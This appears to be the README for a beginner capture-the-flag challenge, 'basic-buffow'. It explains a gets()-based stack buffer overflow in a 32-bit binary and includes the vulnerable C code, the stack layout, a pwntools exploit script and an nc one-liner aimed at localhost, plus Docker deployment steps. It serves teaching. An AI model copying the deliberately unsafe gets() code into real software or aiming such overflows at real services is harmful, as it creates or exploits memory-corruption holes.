# PWN Challenge: basic-buffow

## Description
This is a basic buffer overflow challenge designed for beginners. The goal is to overflow a buffer and modify a stack variable to change the program's execution flow and read the flag.

## Challenge Details
- **Binary**: `basic-buffow` (32-bit ELF)
- **Vulnerability**: Buffer overflow in `main()` function using `gets()`
- **Objective**: Overwrite the `value` variable to make it != 1337
- **Architecture**: x86 (32-bit)
- **Protections**: No stack protector, executable stack, no PIE
- **Difficulty**: Beginner

## Vulnerability Analysis
```c
int main() {
    char buffer[256];       // 256-byte buffer
    int value = 1337;       // Target variable to overwrite
    
    printf("namaaaaaa panjangmuuu: ");
    gets(buffer);           // Vulnerable - no bounds checking
    
    if (value != 1337) {
        // Reads and prints flag from flag.txt
        FILE *flag_file = fopen("flag.txt", "r");
        // ... prints flag
    } else {
        printf("halo %s!\n", buffer);
    }
}
```

## Stack Layout
The stack layout in the `main()` function:
```
Higher addresses
+------------------+
| Return Address   |  
+------------------+
| Saved EBP        |  
+------------------+
| value (4 bytes)  |  ← Target: must be != 1337
+------------------+
| buffer[256]      |  ← Input goes here
+------------------+
Lower addresses
```

## Exploitation Strategy
1. **Understand the goal**: Change `value` from 1337 to any other number
2. **Calculate offset**: Find exact bytes needed to reach `value` variable
3. **Craft payload**: `buffer_padding + any_value_except_1337`
4. **Trigger condition**: Make the if statement evaluate to true

## Example Exploit
```python
from pwn import *

# Connect to service
io = remote('localhost', 9997)

# Payload: 256 bytes of padding + different value
payload = b'A' * 256                   # Fill buffer completely
payload += p32(0x42424242)             # Overwrite value with anything != 1337

# Send payload
io.sendlineafter(b'namaaaaaa panjangmuuu: ', payload)
io.interactive()
```

## Simple Manual Test
You can also test manually with a long string:
```bash
echo $(python -c "print('A' * 260)") | nc localhost 9997
```

## Deployment

### Using Docker Compose
```bash
cd server
docker-compose up --build -d
```

The service will be available on port 9997.

### Manual Docker Build
```bash
cd server
docker build -t basic-buffow .
docker run -p 9997:9997 basic-buffow
```

## Testing Connection
```bash
nc localhost 9997
```

## Files Structure
```
server/
├── Dockerfile
├── docker-compose.yml
├── README.md
└── files/
    ├── basic-buffow                   # Challenge binary (32-bit)
    └── flag.txt                       # Flag file
```

## Security Features
- Container runs with `nobody` user
- Resource limits applied (128M RAM, 0.5 CPU)
- Read-only filesystem with tmpfs for `/tmp`
- No new privileges allowed

## Learning Objectives
- Understanding basic buffer overflow concepts
- Stack variable layout and memory corruption
- Simple condition bypass techniques
- Introduction to binary exploitation

## Key Concepts
- **Buffer Overflow**: Writing beyond allocated buffer space
- **Stack Variables**: Local variables stored on the stack
- **Memory Layout**: How variables are arranged in memory
- **Condition Bypass**: Changing program flow through memory corruption

## Hints for Beginners
- Buffer size is exactly 256 bytes
- You need to overflow into the `value` variable
- Any value except 1337 will work (0x42424242, 0x00000000, etc.)
- Use tools like `python`, `perl`, or `pwntools` to generate long strings
- Remember x86 uses little-endian byte ordering

## Debugging Tips
- Use `gdb` to examine stack layout
- Check stack frame with `info frame`
- Set breakpoints before and after `gets()`
- Examine variables with `print value`

## Common Mistakes
- Not sending enough bytes to reach the variable
- Sending too many bytes and crashing the program
- Forgetting about endianness when crafting payloads

## Next Steps
After solving this challenge, try:
- `cek-var` - More complex variable control
- `ret2win` - Return address overwrite
- `cek-var-tapi-beda` - ROP techniques

## Stopping the Service
```bash
docker-compose down
```
